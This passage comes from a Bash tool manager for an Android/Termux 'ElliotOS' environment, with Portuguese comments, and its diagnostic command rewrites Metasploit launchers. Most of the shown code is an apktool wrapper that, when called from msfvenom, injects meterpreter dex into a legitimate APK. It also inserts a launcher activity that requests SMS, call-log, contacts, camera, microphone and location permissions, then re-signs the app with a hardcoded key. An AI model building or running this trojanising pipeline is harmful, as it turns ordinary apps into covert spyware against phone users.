        for f in $(ls "$XPM_DB"/*.tool 2>/dev/null | sort); do
            [ -f "$f" ] || continue
            local n desc tok
            n=$(    grep "^name="        "$f" | cut -d= -f2-)
            cat=$(  grep "^category="    "$f" | cut -d= -f2-)
            desc=$( grep "^description=" "$f" | cut -d= -f2-)
            tok=$(  grep "^termux_ok="   "$f" | cut -d= -f2-)
            if [ "$cat" != "$cur_cat" ]; then
                printf "\n  ${Y}── %s ──${R}\n" "$cat"
                cur_cat="$cat"
            fi
            local inst_mark="" tok_color="$G" eo_mark=""
            _is_installed "$n" && inst_mark=" ${G}[instalado]${R}"
            [ "$tok" = "no" ] && tok_color="$E"
            [ "$tok" = "partial" ] && tok_color="$Y"
            grep -q "^builtin=yes" "$f" 2>/dev/null && eo_mark=" ${M}[★ ElliotOS]${R}"
            printf "  ${W}%-16s${R} %s%s%s\n" "$n" "$desc" "$eo_mark" "$inst_mark"
            count=$((count+1))
        done
        printf "\n  ${DIM}Total: %d ferramentas disponíveis no XPM${R}\n" "$count"
        printf "  ${DIM}Instale qualquer uma com: xpm install <nome>${R}\n\n"
        return 0
    fi

    _head "Resultados para: $term"
    local count=0

    for f in "$XPM_DB"/*.tool; do
        [ -f "$f" ] || continue
        # Busca em nome, descrição, categoria e tags
        if grep -qi "$term" "$f" 2>/dev/null; then
            local n cat desc tok
            n=$(    grep "^name="        "$f" | cut -d= -f2-)
            cat=$(  grep "^category="   "$f" | cut -d= -f2-)
            desc=$( grep "^description=" "$f" | cut -d= -f2-)
            tok=$(  grep "^termux_ok="  "$f" | cut -d= -f2-)
            local inst_mark="" eo_mark=""
            _is_installed "$n" && inst_mark="${G}[instalado]${R} "
            local tok_color="$G"
            [ "$tok" = "no" ] && tok_color="$E"
            [ "$tok" = "partial" ] && tok_color="$Y"
            grep -q "^builtin=yes" "$f" 2>/dev/null && eo_mark="  ${M}★ ElliotOS-exclusive${R}"
            printf "  ${W}%-20s${R} ${DIM}[%s]${R} %s\n" "$n" "$cat" "$desc"
            printf "    %sTermux: %s${R}  %s%s\n" "$tok_color" "$tok" "$inst_mark" "$eo_mark"
            count=$((count+1))
        fi
    done

    [ "$count" -eq 0 ] && _warn "Nenhum resultado para '$term'."
    printf "\n  ${DIM}%d resultado(s)${R}\n" "$count"
}

cmd_info() {
    local name="$1"
    [ -z "$name" ] && { _err "Uso: xpm info <ferramenta>"; exit 1; }
    _db_exists "$name" || _die "Ferramenta '$name' não encontrada."

    _head "Info: $name"
    cat "$XPM_DB/${name}.tool" | while IFS='=' read -r k v; do
        printf "  ${B}%-18s${R} %s\n" "$k" "$v"
    done
    if _is_installed "$name"; then
        local inst_date
        inst_date=$(cat "$XPM_INSTALLED/${name}.installed" 2>/dev/null)
        printf "  ${G}%-18s${R} %s\n" "instalado_em" "$inst_date"
    fi
}

cmd_categories() {
    _head "Categorias disponíveis"
    for f in "$XPM_DB"/*.tool; do
        [ -f "$f" ] || continue
        grep "^category=" "$f" | cut -d= -f2-
    done | sort -u | while read -r cat; do
        local cnt
        cnt=$(grep -rl "^category=$cat" "$XPM_DB" 2>/dev/null | wc -l)
        printf "  ${Y}%-30s${R} ${DIM}%d ferramenta(s)${R}\n" "$cat" "$cnt"
    done
}

cmd_doctor() {
    _head "XPM Doctor — Diagnóstico do ambiente"
    local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
    local _issues=0

    _is_termux && printf "  ${G}✓${R} Ambiente: Termux (Android)\n" || \
                  printf "  ${B}✓${R} Ambiente: Linux Desktop\n"
    printf "  ${DIM}Arch: $(_arch)${R}\n\n"

    local tools_check="git python3 pip3 go cargo gem node npm"
    for t in $tools_check; do
        if command -v "$t" &>/dev/null; then
            local ver
            ver=$("$t" --version 2>/dev/null | head -1 || echo "?")
            printf "  ${G}✓${R} %-10s %s\n" "$t" "${DIM}$ver${R}"
        else
            printf "  ${E}✗${R} %-10s ${DIM}não encontrado${R}\n" "$t"
        fi
    done

    # ── Diagnóstico específico do Metasploit ─────────────────────────────────
    if _is_installed "metasploit"; then
        printf "\n  ${W}[Metasploit]${R}\n"
        local dest="$HOME/.xpm/tools/metasploit"
        local gems="$HOME/.xpm/gems/metasploit"

        # Checa infocmp (ncurses-utils) — causa do crash rb-readline no Termux
        if command -v infocmp &>/dev/null; then
            printf "  ${G}✓${R} infocmp (ncurses-utils) encontrado\n"
        else
            printf "  ${E}✗${R} infocmp ${DIM}não encontrado${R} — ${Y}isso causa o crash do msfconsole!${R}\n"
            printf "      ${DIM}Corrigindo: pkg install ncurses-utils...${R}\n"
            pkg install -y ncurses-utils 2>/dev/null && \
                printf "  ${G}✓${R} ncurses-utils instalado\n" || \
                printf "  ${E}✗${R} Falha ao instalar ncurses-utils — rode manualmente: pkg install ncurses-utils\n"
            _issues=$(( _issues + 1 ))
        fi

        # Checa se os wrappers têm o boot enxuto (fix para instalações antigas
        # sem TERM exportado E instalações anteriores à otimização -q/RUBYOPT)
        # e também o banner próprio do ElliotOS (marcador V1 no arquivo).
        if [ -f "$BPFX/bin/msfconsole" ]; then
            if grep -q 'export TERM' "$BPFX/bin/msfconsole" \
                && grep -q 'XPM_MSF_WRAPPER_ELLIOTOS_BANNER_V1' "$BPFX/bin/msfconsole" \
                && grep -q 'pgrep -x postgres' "$BPFX/bin/msfconsole" \
                && grep -q '.local/bin' "$BPFX/bin/msfconsole"; then
                printf "  ${G}✓${R} wrapper msfconsole com TERM + boot enxuto + banner ElliotOS\n"
            else
                printf "  ${Y}!${R} wrapper msfconsole desatualizado — corrigindo...\n"
                local gdp
                gdp=$(ruby -e 'puts Gem.default_path.join(":")' 2>/dev/null || echo "")
                cat > "$BPFX/bin/msfconsole" << WEOF
#!/usr/bin/env bash
# XPM_MSF_WRAPPER_ELLIOTOS_BANNER_V1
export TERM="\${TERM:-xterm-256color}"
export BUNDLE_GEMFILE="$dest/Gemfile"
export GEM_HOME="$gems"
export GEM_PATH="$gems:$gdp"
export PATH="$HOME/.local/bin:$gems/bin:$BPFX/bin:\$PATH"
export LD_LIBRARY_PATH="$BPFX/lib:\${LD_LIBRARY_PATH:-}"
export RUBYOPT="\${RUBYOPT:-} -W0"
export ELLIOT_BANNER=0
_P=\$'\033[1;35m'; _B=\$'\033[1;34m'; _Y=\$'\033[1;33m'
_C=\$'\033[1;36m'; _W=\$'\033[1;37m'; _G=\$'\033[1;32m'; _R=\$'\033[0m'
printf '\n'
printf '  %s███████╗%s██╗     %s██╗     %s██╗%s ██████╗ %s████████╗%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
printf '  %s██╔════╝%s██║     %s██║     %s██║%s██╔═══██╗%s╚══██╔══╝%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
printf '  %s█████╗  %s██║     %s██║     %s██║%s██║   ██║%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
printf '  %s██╔══╝  %s██║     %s██║     %s██║%s██║   ██║%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
printf '  %s███████╗%s███████╗%s███████╗%s██║%s╚██████╔╝%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
printf '  %s╚══════╝%s╚══════╝%s╚══════╝%s╚═╝%s ╚═════╝ %s   ╚═╝   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_R"
printf '  %s╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌%s\n' "\$_C" "\$_R"
printf '  %sMetasploit Framework%s — %sotimizado por Mike Elliot%s | %sexclusivo no ElliotOS%s\n' "\$_W" "\$_R" "\$_G" "\$_R" "\$_C" "\$_R"
printf '  %s╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌%s\n\n' "\$_C" "\$_R"
_msf_db_args=()
if pgrep -x postgres >/dev/null 2>&1; then
    printf '  %s[xpm]%s banco detectado\n' "\$_G" "\$_R" >&2
else
    printf '  %s[xpm]%s banco parado — abrindo sem DB\n' "\$_Y" "\$_R" >&2
    _msf_db_args=(--no-database)
fi
cd "$dest" || exit 1
exec bundle exec msfconsole -q "\${_msf_db_args[@]}" "\$@"
WEOF
                chmod +x "$BPFX/bin/msfconsole"
                printf "  ${G}✓${R} wrapper msfconsole corrigido\n"
                _issues=$(( _issues + 1 ))
            fi
        else
            printf "  ${E}✗${R} msfconsole não encontrado em PATH — reinstale com: xpm install metasploit\n"
            _issues=$(( _issues + 1 ))
        fi

        # Checa se os wrappers msfvenom/msfrpc/etc têm o heap adaptativo (fix OOM
        # Wrappers msfvenom/msfdb/msfrpc/msfrpcd: sempre recria (garante versão atualizada)
        local gdp
        gdp=$(ruby -e 'puts Gem.default_path.join(":")' 2>/dev/null || echo "")
        for msf_bin in msfvenom msfdb msfrpc msfrpcd; do
            rm -f "$BPFX/bin/$msf_bin"
            cat > "$BPFX/bin/$msf_bin" << WEOF
#!/usr/bin/env bash
export TERM="${TERM:-xterm-256color}"
export BUNDLE_GEMFILE="$dest/Gemfile"
export GEM_HOME="$gems"
export GEM_PATH="$gems:$gdp"
export PATH="$HOME/.local/bin:$gems/bin:$BPFX/bin:\$PATH"
export LD_LIBRARY_PATH="$BPFX/lib:\${LD_LIBRARY_PATH:-}"
_MSF_XMX="\$(awk '/^MemAvailable:/{v=int(\$2*0.75/1024); if(v<512)v=512; if(v>4096)v=4096; print v; f=1} END{if(!f)print 1536}' /proc/meminfo 2>/dev/null)"
[ -z "\$_MSF_XMX" ] && _MSF_XMX=1536
export _JAVA_OPTIONS="-Xmx\${_MSF_XMX}m"
_msf_args=()
_msf_next_abs=0
for _msf_a in "\$@"; do
    if [ "\$_msf_next_abs" = "1" ]; then
        case "\$_msf_a" in
            /*) : ;;
            *)
                if [ -e "\$_msf_a" ]; then
                    _msf_a="\$(readlink -f "\$_msf_a" 2>/dev/null || echo "\$PWD/\$_msf_a")"
                else
                    _msf_a="\$PWD/\$_msf_a"
                fi
                ;;
        esac
        _msf_next_abs=0
    fi
    case "\$_msf_a" in -x|-o) _msf_next_abs=1 ;; esac
    _msf_args+=("\$_msf_a")
done
cd "$dest" || exit 1
exec bundle exec "$msf_bin" "\${_msf_args[@]}"
WEOF
            chmod +x "$BPFX/bin/$msf_bin"
        done
        printf "  ${G}✓${R} wrappers msfvenom/msfrpc com heap adaptativo\n"

        # Checa keystore de assinatura EC P-256
        local _ks_dest_dr="$HOME/.xpm/tools/apktool/xpm-compat-test.keystore"
        if [ -f "$_ks_dest_dr" ]; then
            printf "  ${G}✓${R} keystore de assinatura presente (~/.xpm/tools/apktool/)\n"
        else
            printf "  ${Y}!${R} keystore ausente — gerando EC P-256 (instantâneo)...\n"
            if command -v keytool >/dev/null 2>&1; then
                mkdir -p "$(dirname "$_ks_dest_dr")"
                keytool -genkeypair \
                    -storepass xpm-compat-test -keypass xpm-compat-test \
                    -alias xpm-compat-test \
                    -keyalg EC -groupname secp256r1 \
                    -validity 10000 \
                    -dname "CN=ElliotOS XPM Compat Test,O=ElliotOS,C=BR" \
                    -deststoretype pkcs12 \
                    -keystore "$_ks_dest_dr" >/dev/null 2>&1 \
                    && printf "  ${G}✓${R} keystore EC P-256 gerada\n" \
                    || printf "  ${Y}!${R} keytool falhou ao gerar keystore\n"
                _issues=$(( _issues + 1 ))
            else
                printf "  ${Y}!${R} keytool não encontrado — instale openjdk-17\n"
            fi
        fi

        # Wrapper java: sempre recria — usa jvm direto (não command -v que acharia nosso wrapper)
        _JAVA_BIN_REAL="$(ls "$BPFX/lib/jvm/"*/bin/java 2>/dev/null | head -1)"
        [ -z "$_JAVA_BIN_REAL" ] && _JAVA_BIN_REAL="$(PATH="$BPFX/bin:/usr/bin:/bin" command -v java 2>/dev/null || echo "$BPFX/bin/java")"
        mkdir -p "$HOME/.local/bin"
        cat > "$HOME/.local/bin/java" << JWEOF
#!/usr/bin/env bash
# XPM_JAVA_HEAP_WRAPPER_V1
_JW_HAS_XMX=0
for _jw_arg in "\$@"; do
    case "\$_jw_arg" in -Xmx*) _JW_HAS_XMX=1; break ;; esac
done
_JW_MEM="\$(awk '/^MemAvailable:/{print int(\$2/1024)}' /proc/meminfo 2>/dev/null || echo 1536)"
if [ "\$_JW_HAS_XMX" = "0" ]; then
    _JW_XMX="\$(awk -v m="\$_JW_MEM" 'BEGIN{v=int(m*0.75); if(v<512)v=512; if(v>4096)v=4096; print v}')"
    [ -z "\$_JW_XMX" ] && _JW_XMX=1536
    set -- "-Xmx\${_JW_XMX}m" "\$@"
fi
_JW_JOBS=1
[ "\$_JW_MEM" -ge 2048 ] 2>/dev/null && _JW_JOBS=4
[ "\$_JW_MEM" -ge 1024 ] 2>/dev/null && [ "\$_JW_MEM" -lt 2048 ] 2>/dev/null && _JW_JOBS=2
case " \$* " in
    *apktool*) set -- "-Dapktool.threads=\${_JW_JOBS}" "\$@" ;;
esac
exec "$_JAVA_BIN_REAL" "\$@"
JWEOF
        chmod +x "$HOME/.local/bin/java"
        if ! grep -qF 'HOME/.local/bin' "$HOME/.bashrc" 2>/dev/null; then
            printf '\nexport PATH="$HOME/.local/bin:$PATH"\n' >> "$HOME/.bashrc"
        fi
        printf "  ${G}✓${R} wrapper do java com heap adaptativo (~/.local/bin/java)\n"

        # Wrapper V2: recria em $BPFX/bin/apktool
        local _rbin_apkeditor=""
        _rbin_apkeditor="$(PATH="$BPFX/bin:/usr/bin:/bin" command -v apkeditor 2>/dev/null || echo "$BPFX/bin/apkeditor")"
        local _ATMPDIR="${TMPDIR:-$BPFX/tmp}"
        cat > "$BPFX/bin/apktool" << 'APKWEOF'
#!/bin/sh
# XPM_APKTOOL_AE_WRAPPER_V2 — apktool → APKEditor (ElliotOS)
_AE="__AE_BIN__"
_XPM_KS="$HOME/.xpm/tools/apktool/xpm-compat-test.keystore"
_XPM_KS_ALIAS="xpm-compat-test"
_XPM_KS_PASS="xpm-compat-test"

export TMPDIR="${TMPDIR:-__ATMPDIR__}"
mkdir -p "$TMPDIR" 2>/dev/null

# OOM fix: heap adaptativo por contexto
_mem_avail=$(awk '/MemAvailable/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
case "$_mem_avail" in ''|*[!0-9]*) _mem_avail=256 ;; esac
_clean_java_opts=$(printf "%s" "${_JAVA_OPTIONS:-}" | sed 's/-Xmx[0-9]*[mMgGkK]*//g;s/-Xms[0-9]*[mMgGkK]*//g')
if [ -n "${BUNDLE_GEMFILE:-}" ]; then
    _xmx=$(( _mem_avail / 2 ))
    [ "$_xmx" -lt 128 ] && _xmx=128
    [ "$_xmx" -gt 512 ] && _xmx=512
else
    _xmx=$(( _mem_avail * 2 / 3 ))
    [ "$_xmx" -lt 128 ] && _xmx=128
    [ "$_xmx" -gt 768 ] && _xmx=768
fi
export _JAVA_OPTIONS="-Xms32m -Xmx${_xmx}m -XX:+UseSerialGC -Djava.io.tmpdir=$TMPDIR ${_clean_java_opts}"

_ae_sign() {
    _apk="$1"; [ -f "$_apk" ] || return 0
    command -v apksigner >/dev/null 2>&1 || return 0
    [ -f "$_XPM_KS" ] || return 0
    _stem="${_apk%.apk}"; _aligned="${_stem}-za.apk"
    if command -v zipalign >/dev/null 2>&1; then
        zipalign -f -p 4 "$_apk" "$_aligned" 2>/dev/null \
            && mv -f "$_aligned" "$_apk" || rm -f "$_aligned"
    fi
    apksigner sign --ks "$_XPM_KS" --ks-key-alias "$_XPM_KS_ALIAS" \
        --ks-pass "pass:$_XPM_KS_PASS" --key-pass "pass:$_XPM_KS_PASS" \
        "$_apk" 2>/dev/null && printf '[xpm] APK assinado: %s\n' "$_apk" >&2
}

# Normaliza estrutura APKEditor → apktool apos decode
# APKEditor: smali/classes/net/... e smali/classes2/com/...
# apktool:   smali/net/...          e smali_classes2/com/...
_ae_normalize_smali() {
    _outdir="$1"
    _smali="$_outdir/smali"
    [ -d "$_smali/classes" ] || return 0
    for _f in "$_smali/classes/"*; do
        [ -e "$_f" ] || continue
        mv -f "$_f" "$_smali/" 2>/dev/null
    done
    rmdir "$_smali/classes" 2>/dev/null
    for _cd in "$_smali/classes"*/; do
        [ -d "$_cd" ] || continue
        _cn=$(basename "$_cd")
        _tgt="$_outdir/smali_${_cn}"
        mkdir -p "$_tgt"
        for _f in "$_cd"*; do
            [ -e "$_f" ] || continue
            mv -f "$_f" "$_tgt/" 2>/dev/null
        done
        rmdir "$_cd" 2>/dev/null
    done
}

# MSF_AE_RUNTIME_PERMS_V1 — cria MsfPermActivity dedicada para pedir permissoes
# Solucao universal: nao toca smali existente, injeta nova Activity como LAUNCHER
# Ela pede as permissoes em runtime (Android 6+) e depois inicia a Activity original
_ae_inject_runtime_perms() {
    local _dir="$1"
    [ -f "$_dir/AndroidManifest.xml" ] || return 0
    [ -n "${BUNDLE_GEMFILE:-}" ]        || return 0  # so no contexto msfvenom
    command -v python3 >/dev/null 2>&1  || return 0
    python3 - "$_dir" << 'AERPEOF'
import sys, os, re
import xml.etree.ElementTree as ET

work = sys.argv[1]
manifest_path = os.path.join(work, 'AndroidManifest.xml')
if not os.path.exists(manifest_path):
    sys.exit(0)

with open(manifest_path) as f:
    mxml = f.read()
if 'MsfPermActivity' in mxml:
    sys.exit(0)  # idempotente

NS = 'http://schemas.android.com/apk/res/android'
try:
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    pkg  = root.get('package', '')
except Exception:
    sys.exit(0)

PERMS_ALL = [
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.RECORD_AUDIO',
    'android.permission.CAMERA',
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.READ_CONTACTS',
    'android.permission.READ_CALL_LOG',
    'android.permission.READ_SMS',
    'android.permission.PROCESS_OUTGOING_CALLS',
    'android.permission.RECEIVE_SMS',
    'android.permission.GET_ACCOUNTS',
]

declared = set()
for p in root.iter('uses-permission'):
    name = p.get(f'{{{NS}}}name') or p.get('android:name', '')
    if name:
        declared.add(name)
perms = [p for p in PERMS_ALL if p in declared]
if not perms:
    sys.exit(0)

# Encontra o launcher Activity original
launcher = None
for act in root.iter('activity'):
    aname = act.get(f'{{{NS}}}name') or act.get('android:name', '')
    if not aname:
        continue
    if aname.startswith('.'):
        aname = pkg + aname
    has_m = has_l = False
    for filt in act.iter('intent-filter'):
        for a in filt.iter('action'):
            v = a.get(f'{{{NS}}}name') or a.get('android:name', '')
            if 'MAIN' in v:
                has_m = True
        for c in filt.iter('category'):
            v = c.get(f'{{{NS}}}name') or c.get('android:name', '')
            if 'LAUNCHER' in v:
                has_l = True
    if has_m and has_l:
        launcher = aname
        break

if not launcher:
    sys.exit(0)

orig_ref  = 'L' + launcher.replace('.', '/') + ';'
n         = len(perms)

# Constroi o array de permissoes em Smali
arr = []
for i, p in enumerate(perms):
    ri = f'const/4 v1, 0x{i:x}' if i < 8 else f'const/16 v1, 0x{i:x}'
    arr += [f'    {ri}', f'    const-string v2, "{p}"', '    aput-object v2, v0, v1', '']
arr_smali = '\n'.join(arr).rstrip()

# Smali da MsfPermActivity — pede permissoes e inicia a Activity original
smali_content = f'''.class public Lcom/metasploit/msfperm/MsfPermActivity;
.super Landroid/app/Activity;
# MSF_AE_RUNTIME_PERMS_V1

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 5
    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    const/16 v0, 0x{n:x}
    new-array v0, v0, [Ljava/lang/String;

{arr_smali}

    const/16 v1, 0x1337
    invoke-virtual {{p0, v0, v1}}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .registers 6
    invoke-super {{p0, p1, p2, p3}}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    new-instance v0, Landroid/content/Intent;
    const-class v1, {orig_ref}
    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {{p0, v0}}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    invoke-virtual {{p0}}, Landroid/app/Activity;->finish()V
    return-void
.end method
'''

# Encontra o diretorio smali/classes (estrutura APKEditor)
smali_root = os.path.join(work, 'smali')
if not os.path.exists(smali_root):
    sys.exit(0)
cdirs = sorted([d for d in os.listdir(smali_root) if d.startswith('classes')])
base  = os.path.join(smali_root, cdirs[0]) if cdirs else smali_root

perm_dir = os.path.join(base, 'com', 'metasploit', 'msfperm')
os.makedirs(perm_dir, exist_ok=True)
with open(os.path.join(perm_dir, 'MsfPermActivity.smali'), 'w') as f:
    f.write(smali_content)

# Patcha o manifest: remove MAIN+LAUNCHER do original, adiciona MsfPermActivity
mxml = re.sub(r'<action\s[^>]*\.MAIN[^>]*/>', '', mxml)
mxml = re.sub(r'<category\s[^>]*\.LAUNCHER[^>]*/>', '', mxml)
new_act = (
    '\n        <activity android:name="com.metasploit.msfperm.MsfPermActivity"'
    ' android:exported="true">\n'
    '            <intent-filter>\n'
    '                <action android:name="android.intent.action.MAIN"/>\n'
    '                <category android:name="android.intent.category.LAUNCHER"/>\n'
    '            </intent-filter>\n'
    '        </activity>'
)
mxml = mxml.replace('</application>', new_act + '\n    </application>', 1)
with open(manifest_path, 'w') as f:
    f.write(mxml)
print('[xpm] MsfPermActivity injetada — dialogo de permissoes ativo ao abrir o app')
AERPEOF
}

case "${1:-}" in

  -version|--version|-v)
    printf '2.9.3\n'; exit 0 ;;

  d|decode)
    shift; _input=""; _output=""; _next_o=0; _force=""
    for _a in "$@"; do
      [ "$_next_o" = 1 ] && { _output="$_a"; _next_o=0; continue; }
      case "$_a" in
        -o|--output) _next_o=1 ;; -f|--force) _force="-f" ;;
        --only-main-classes|-r|--no-res|-s|--no-src|-q|--quiet) : ;;
        -p|--frame-path|-t|--tag|-j|--jobs) _next_o=1 ;;
        -*) : ;; *) [ -z "$_input" ] && _input="$_a" ;;
      esac
    done
    [ -z "$_input" ] && { printf '[xpm] erro: apktool d — nenhum APK\n' >&2; exit 1; }
    [ ! -f "$_input" ] && { printf '[xpm] erro: nao encontrado: %s\n' "$_input" >&2; exit 1; }
    if [ -z "$_output" ]; then
        _base=$(basename "$_input" .apk)
        _output="$(dirname "$_input")/${_base}"
    fi
    set -- d -i "$_input" -o "$_output" -load-dex 1
    [ -n "$_force" ] && set -- "$@" -f
    "$_AE" "$@"; _rc=$?
    if [ "$_rc" -ne 0 ]; then
        printf '[xpm] decode APKEditor falhou (exit %d)\n' "$_rc" >&2
        exit "$_rc"
    fi
    # Verifica se o AndroidManifest.xml foi criado (APKEditor pode ser morto por OOM)
    if [ ! -f "$_output/AndroidManifest.xml" ]; then
        printf '[xpm] decode: AndroidManifest.xml ausente em %s\n' "$_output" >&2
        printf '[xpm] conteudo: %s\n' "$(ls "$_output/" 2>/dev/null | tr "\n" " ")" >&2
        exit 1
    fi
    # Nao normaliza no contexto msfvenom: APKEditor b precisa de smali/classes/
    [ -z "${BUNDLE_GEMFILE:-}" ] && _ae_normalize_smali "$_output"
    exit 0 ;;

  b|build)
    shift; _input=""; _output=""; _next_o=0; _force=""
    for _a in "$@"; do
      [ "$_next_o" = 1 ] && { _output="$_a"; _next_o=0; continue; }
      case "$_a" in
        -o|--output) _next_o=1 ;; -f|--force-all) _force="-f" ;;
        -p|--frame-path|-a|--aapt|-j|--jobs) _next_o=1 ;;
        -*) : ;; *) [ -z "$_input" ] && _input="$_a" ;;
      esac
    done
    [ -z "$_input" ] && { printf '[xpm] erro: apktool b — nenhuma pasta\n' >&2; exit 1; }
    [ ! -d "$_input" ] && { printf '[xpm] erro: pasta nao encontrada: %s\n' "$_input" >&2; exit 1; }
    [ -z "$_output" ] && { mkdir -p "$_input/dist"; _output="$_input/dist/$(basename "$_input").apk"; }

    # Contexto msfvenom: patch cirurgico correto
    # Base = APK original (preserva .so libs, assets, res, tudo intacto)
    # Substitui APENAS: dex (com meterpreter) + AndroidManifest.xml (com permissoes)
    # Extracao via "unzip -p" (pipe) — confiavel, sem glob, sem silencio em erros
    # Motivo da falha anterior: unzip com glob "*" nao extraia dex silenciosamente
    _orig_apk="$(dirname "$_input")/$(basename "$_input").apk"
    if [ -n "${BUNDLE_GEMFILE:-}" ] && [ -f "$_orig_apk" ]; then
        # Passo 1: APKEditor compila smali → dex (meterpreter incluido)
        _ae_tmp="$(dirname "$_output")/_ae_$$"
        # Remove atributos de build nao reconhecidos pelo framework android-23
        # android:compileSdkVersion e compileSdkVersionCodename sao metadados
        # adicionados pelo AGP 3.0+ — nao sao necessarios em runtime
        sed -i 's/ android:compileSdkVersion="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
        sed -i 's/ android:compileSdkVersionCodename="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
        sed -i 's/ android:roundIcon="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
        # Remove dirs v24+ — framework android-23 nao os suporta (patch cirurgico usa resources do APK original)
        find "$_input/resources" -type d \( -name '*-v2[4-9]' -o -name '*-v[3-9][0-9]' \) \
            -exec rm -rf {} + 2>/dev/null; true
        _ae_inject_runtime_perms "$_input"
        "$_AE" b -i "$_input" -o "$_ae_tmp"; _rc=$?
        # Fallback iterativo: trata erros de resource e de atributos do manifest
        # sem esvaziar resources nem raspar o manifest inteiro
        if [ "$_rc" -ne 0 ] || [ ! -f "$_ae_tmp" ]; then
            rm -f "$_ae_tmp"
            _ae_err="$(dirname "$_output")/_ae_err_$$"
            _retry=0
            while [ "$_retry" -lt 20 ]; do
                "$_AE" b -i "$_input" -o "$_ae_tmp" 2>"$_ae_err"; _rc=$?
                [ "$_rc" -eq 0 ] && [ -f "$_ae_tmp" ] && break
                # Extrai o arquivo que causou o erro
                _fail_file=$(awk '/^at \//{gsub(/^at /,""); gsub(/ \[line.*/,""); print; exit}' "$_ae_err" 2>/dev/null)
                # Extrai atributo desconhecido (android-23 nao conhece roundIcon, etc.)
                _fail_attr=$(grep "Unknown attribute name" "$_ae_err" 2>/dev/null | sed "s/.*Unknown attribute name '//;s/'.*//" | head -1)
                case "$_fail_file" in
                    "$_input"/resources/*)
                        # Arquivo de resource falhou — remove e tenta de novo
                        rm -f "$_fail_file" 2>/dev/null ;;
                    "$_input"/AndroidManifest.xml)
                        # Atributo desconhecido no manifest — remove só esse atributo
                        if [ -n "$_fail_attr" ]; then
                            sed -i "s/ ${_fail_attr}=\"[^\"]*\"//g" "$_input/AndroidManifest.xml" 2>/dev/null
                        else
                            break
                        fi ;;
                    *) break ;;
                esac
                _retry=$((_retry + 1))
            done
            rm -f "$_ae_err"
        fi
        if [ "$_rc" -ne 0 ] || [ ! -f "$_ae_tmp" ]; then
            rm -f "$_ae_tmp"
            printf '[xpm] build APKEditor falhou (exit %d)\n' "$_rc" >&2
            exit "${_rc:-1}"
        fi
        # Passo 2: extrai dex + manifest do build — arquivo por arquivo (sem glob)
        _ptmp="$(dirname "$_output")/_patch_$$"
        mkdir -p "$_ptmp"
        # Lista os dex no build e extrai cada um individualmente via pipe
        for _dn in $(unzip -l "$_ae_tmp" 2>/dev/null | awk '/\.dex$/{print $NF}'); do
            unzip -p "$_ae_tmp" "$_dn" > "$_ptmp/$_dn" 2>/dev/null
        done
        unzip -p "$_ae_tmp" AndroidManifest.xml > "$_ptmp/AndroidManifest.xml" 2>/dev/null
        # Passo 3: copia APK original como base (preserva lib, assets, res, tudo)
        cp "$_orig_apk" "$_output"
        # Passo 4: remove entradas antigas e injeta as modificadas
        cd "$_ptmp"
        for _f in *.dex AndroidManifest.xml; do
            [ -f "$_f" ] || continue
            zip -d "$_output" "$_f" 2>/dev/null || true
            zip "$_output" "$_f" 2>/dev/null
        done
        # Passo 5: remove assinatura velha (apk.rb re-assina depois)
        zip -d "$_output" "META-INF/*" 2>/dev/null || true
        cd -
        rm -rf "$_ptmp" "$_ae_tmp"
    else
        # Uso manual ou original nao encontrado: build completo normal
        "$_AE" b -i "$_input" -o "$_output"; _rc=$?
        if [ "$_rc" -ne 0 ]; then
            printf '[xpm] build falhou (exit %d) — use -f para forcar\n' "$_rc" >&2; exit "$_rc"
        fi
    fi
    _ae_sign "$_output" ;;

  if|install-framework|empty-framework-dir|publicize-framework)
    printf '[xpm] aviso: "%s" nao suportado — ignorado\n' "$1" >&2; exit 0 ;;

  *) exec "$_AE" "$@" ;;

esac
APKWEOF
        sed -i "s|__AE_BIN__|${_rbin_apkeditor}|g" "$BPFX/bin/apktool"
        sed -i "s|__ATMPDIR__|${_ATMPDIR}|g" "$BPFX/bin/apktool"
        chmod +x "$BPFX/bin/apktool"
        rm -f "$HOME/.local/bin/apktool" 2>/dev/null || true
        printf "  ${G}✓${R} wrapper apktool→APKEditor V2 instalado ($BPFX/bin/apktool)\n"

        # Checa se apktool e apkeditor estao disponiveis
        if command -v apktool >/dev/null 2>&1; then
            printf "  ${G}${R} apktool disponivel (para msfvenom -x)\n"
        else
            printf "  ${Y}!${R} apktool nao encontrado - rode: xpm install apkfull\n"
            _issues=$(( _issues + 1 ))
        fi
        if command -v apkeditor >/dev/null 2>&1; then
